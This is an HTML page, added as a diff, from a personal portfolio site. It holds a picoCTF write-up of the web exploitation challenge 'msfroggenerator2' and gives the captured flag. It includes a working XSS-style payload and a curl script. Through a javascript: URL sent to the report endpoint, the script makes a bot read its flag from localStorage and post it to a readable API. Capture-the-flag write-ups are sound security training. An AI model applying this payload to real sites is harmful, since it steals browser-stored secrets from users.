@@ -1,0 +1,156 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <title>ravi Portfolio Website</title>
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/normalize/7.0.0/normalize.min.css">
+        <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/5.11.2/css/all.css" integrity="sha256-46qynGAkLSFpVbEBog43gvNhfrOj+BmwXdxFgVK/Kvc=" crossorigin="anonymous" />  
+        
+        <!-- Update these with your own fonts -->
+        <link href="https://fonts.googleapis.com/css?family=Source+Code+Pro:400,900|Source+Sans+Pro:300,900&display=swap" rel="stylesheet">
+        
+        <link rel="stylesheet" href="/style.css">
+
+        <link rel="apple-touch-icon" sizes="180x180" href="/favicon_io/apple-touch-icon.png">
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon_io/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon_io/favicon-16x16.png">
+        <link rel="manifest" href="/favicon_io/site.webmanifest">
+
+        <script src="https://kit.fontawesome.com/82ec6e3755.js" crossorigin="anonymous"></script>
+
+    </head>
+    <body>
+        <header>
+            <div class="logo">
+                <img src="img/" alt="">
+            </div>
+            <button class="nav-toggle" aria-label="toggle navigation">
+                <span class="hamburger"></span>
+            </button>
+            <nav class="nav">
+                <ul class="nav__list">
+                    <li class="nav__item"><a href="/index.html" class="nav__link">Home</a></li>
+                    <li class="nav__item"><a href="/index.html#services" class="nav__link">My Services</a></li>
+                    <li class="nav__item"><a href="/index.html#about" class="nav__link">About me</a></li>
+                    <li class="nav__item"><a href="/index.html#work" class="nav__link">My Work</a></li>
+                </ul>
+            </nav>
+        </header>
+        
+
+        <section class="intro">
+            <h1 class="section__title section__title--intro">
+                 <strong>Pico CTF</strong>
+            </h1>
+            <p class="section__subtitle section__subtitle--intro">msfroggenerator2</p>
+            <img src="/img/ravi.JPG" alt="" class="intro__img">
+        </section>
+        
+        <div class="portfolio-item-individual">
+            <p>msfroggenerator2 is an Web Exlpoitation challenge. It is an hard category challenge.
+                Here is an first look of the <a href="https://play.picoctf.org/practice/challenge/360?category=1&page=5" class="challenge_link" target="_blank">challenge</a>
+            </p>
+            <img src="msfroggenerator2_intro.png" class="img_picoCTF">
+            <p>On lunching the instance we get a website aslo we get source code to download and analyze
+                the code.
+            </p>
+            <img src="website.png" class="img_picoCTF">
+            <p>Here we have a canvas, emojis, share button and export button. We can pick any
+                emoji and create images. On clicking export we can download the image. When we click 
+            share button the url changes and an id parameter is added. <code>http://saturn.picoctf.net:58128/?id=1GURybiXjO</code></p>
+            
+            <p>So, we can assume that we can exploit this id with XSS playloads. On exploring the 
+                source code we find two interesting bot and api. Api handles creation of images and reports.
+                It has GET and POST methods for /api/get, /api/create, /api/reports/get and /api/reports/add
+                paths. reports/get and add are two interesting paths to look at. The reports/add requires authentication
+                and it requires flag to authenticate.
+            </p>
+
+            <img src="report_add.png" class="img_picoCTF">
+            
+            <p>The bot.js code reveals that the flag is stored in  localstorage, then headers with authentication
+                and some body content is sent.
+            </p>
+
+            <img src="authenticate.png" class="img_picoCTF">
+
+            <p>So we now know that we can exploit this reports add and get to get our flag. On checking the 
+                website i found that we can send /report with the id and it says sent. Also we can send
+                url as:
+            </p>
+            <img src="report_id_url.png" class="img_picoCTF">
+
+            <p>Also we have reports/add which adds the reports with authentication as a flag. So, we can exploit these with reports/get to display the flag.
+                So, we can prepare an playload that sends the authentication headers as:
+            </p>
+            <div class="playload solution">
+                <div>
+                    {
+                        method: "POST",<br>
+                        headers: {<br>
+                            "Content-Type": "application/json",<br>
+                            "Authentication": `Bearer%20${localStorage.getItem('\''flag'\'')}`<br>
+                        },<br>
+                        body: JSON.stringify({screenshot:localStorage.getItem('\''flag'\'')})<br>
+                    }
+                </div>
+            </div>
+
+            <p>To send this playload we write a bash script that uses curl and post the 
+                header and body content. Also to get/display the flag. The bash script is as:
+            </p>
+            <div class="shell_script solution">
+                <div>
+                    #!/bin/bash <br><br>
+                    port=64305 <br><br>
+                    curl --globoff 'http://saturn.picoctf.net:'$port'/report?id=;url=javascript:fetch("/api/reports/add",{method:"POST",headers:{"Content-Type":"application/json","Authorization":`Bearer%20${localStorage<br>.getItem('\''flag'\'')}`},body:JSON.stringify({screenshot:localStorage<br>.getItem('\''flag'\'')})})' -v
+                    <br><br>
+                    sleep 4
+                    <br><br>
+                    curl 'http://saturn.picoctf.net:'$port'/api/reports/get'
+                </div>
+            </div>
+
+            <p>Here the port number may vary every time. We load/send this playload on url=javascript: and paste our playload with
+                fetch("/api/reports/add",playload).
+            </p>
+            <p>Then we get flag as: <span>Sent![{"screenshot":"picoCTF{th3_fsf_mak3s_th3_b3st_s0ftwar3_1dced559}"}]</span></p>
+            <img src="flag.png" class="img_picoCTF">
+            <p><code>picoCTF{th3_fsf_mak3s_th3_b3st_s0ftwar3_1dced559}</code> is the required flag.</p>
+        </div>
+        
+        
+        <!-- Footer -->
+        <footer class="footer">
+            <!-- replace with your own email address -->
+            <a href="" class="footer__link">graviraj344@gmail.com</a>
+            <ul class="social-list">
+                <li class="social-list__item">
+                    <a class="social-list__link" href="https://codepen.io">
+                        <i class="fab fa-codepen"></i>
+                    </a>
+                </li>
+                <li class="social-list__item">
+                    <a class="social-list__link" href="http://facebook.com">
+                        <i class="fa-brands fa-facebook"></i>
+                    </a>
+                </li>
+                <li class="social-list__item">
+                    <a class="social-list__link" href="https://twitter.com">
+                        <i class="fab fa-twitter"></i>
+                    </a>
+                </li>
+                <li class="social-list__item">
+                    <a class="social-list__link" href="https://github.com">
+                        <i class="fab fa-github"></i>
+                    </a>
+                </li>
+            </ul>
+        </footer>
+        
+        
+        <script src="/index.js"></script>
+        
+    </body>
+</html>
